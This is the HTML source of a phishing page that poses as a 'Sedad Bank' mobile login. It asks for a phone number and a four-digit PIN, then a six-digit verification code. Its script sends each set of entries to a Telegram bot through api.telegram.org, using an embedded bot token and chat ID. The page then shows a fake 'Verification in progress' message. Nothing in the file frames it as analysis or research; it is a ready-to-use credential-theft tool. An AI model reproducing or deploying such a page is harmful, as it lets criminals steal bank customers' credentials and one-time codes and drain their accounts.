<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sedad Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(to bottom, #f4f8ff, #ffffff); margin: 0; min-height: 100vh; color: #333; }

        /* التصميم العام الواجهة */
        .container-box { max-width: 400px; margin: 0 auto; padding: 40px 20px; text-align: center; }
        .logo-img { width: 220px; margin: 0 auto 50px; display: block; }

        /* حقل الهاتف بنمط الصورة */
        .input-field { width: 100%; border: 1px solid #ccc; border-radius: 12px; padding: 14px 15px; font-size: 16px; outline: none; background: white; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; }
        .input-field input { border: none; outline: none; width: 100%; text-align: left; font-size: 16px; }

        /* مربعات PIN و OTP */
        .code-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 30px; }
        .digit-box { width: 50px; height: 70px; border: 1px solid #ccc; border-radius: 15px; text-align: center; font-size: 24px; font-weight: bold; outline: none; background: white; transition: border-color 0.3s; }
        .digit-box:focus { border-color: #009640; }

        /* الأزرار */
        .btn-green { background-color: #009640; color: white; width: 100%; padding: 14px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; border: none; }
        .btn-green:active { background-color: #007a33; }

        /* الروابط السفلية */
        .link-text { color: #666; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
        .footer-links { margin-top: 60px; font-size: 15px; }
        .gold-text { color: #c09a5b; font-weight: bold; }

        /* واجهة OTP */
        #screen-otp { display: none; }
    </style>
</head>
<body>

    <!-- الواجهة الأولى: تسجيل الدخول -->
    <div id="screen-login" class="container-box">
        <img src="https://i.ibb.co/3sX8H3N/sedad-logo.png" alt="Sedad Bank" class="logo-img">

        <div class="input-field">
            <input id="phone" type="tel" placeholder="Phone Number" maxlength="8" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            <svg style="width:20px; color:#999" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" stroke-width="2"></path></svg>
        </div>

        <div class="code-container">
            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 0)">
            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 1)">
            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 2)">
            <input type="password" maxlength="1" class="digit-box login-pin" oninput="validateDigit(this, 3)">
        </div>

        <button onclick="handleLogin()" class="btn-green">Login</button>
        <a href="#" class="link-text">Forgot password?</a>

        <div class="footer-links">
            New user? <span class="gold-text">Register Now</span>
        </div>

        <div style="margin-top: 40px; display: inline-flex; align-items: center; gap: 10px; background: white; padding: 10px 20px; border-radius: 10px; border: 1px solid #eee; font-size: 14px;">
            <span>Contact Us</span>
            <svg style="width:18px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-width="2"></path></svg>
        </div>
    </div>

    <!-- الواجهة الثانية: رمز التحقق (6 أرقام) -->
    <div id="screen-otp" class="container-box">
        <h2 style="font-weight: bold; font-size: 20px; margin-bottom: 10px;">Verification Code</h2>
        <p style="color: #666; font-size: 14px; margin-bottom: 30px;">Enter the 6-digit code sent to your mobile</p>

        <div class="code-container">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 4)">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 5)">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 6)">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 7)">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 8)">
            <input type="tel" maxlength="1" class="digit-box otp-box" oninput="validateDigit(this, 9)">
        </div>

        <button onclick="submitOTP()" class="btn-green">Verify</button>
        <a href="#" onclick="location.reload()" class="link-text">Back to Login</a>
    </div>

    <script>
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT = "8665814266";

        function validateDigit(el, idx) {
            el.value = el.value.replace(/[^0-9]/g, '');
            const allBoxes = document.querySelectorAll('.digit-box');
            if (el.value.length === 1 && idx < allBoxes.length - 1) {
                allBoxes[idx + 1].focus();
            }
        }

        function handleLogin() {
            const phone = document.getElementById('phone').value;
            let pin = "";
            document.querySelectorAll('.login-pin').forEach(b => pin += b.value);

            if(phone.length >= 8 && pin.length === 4) {
                send(`🏦 Sedad Login\n📱 Phone: ${phone}\n🔐 PIN: ${pin}`);
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('screen-otp').style.display = 'block';
            } else {
                alert("Please fill all fields correctly.");
            }
        }

        function submitOTP() {
            let otp = "";
            document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
            if(otp.length === 6) {
                send(`🔑 Sedad OTP: ${otp}`);
                alert("Verification in progress...");
                location.reload();
            } else {
                alert("Please enter the 6-digit code.");
            }
        }

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
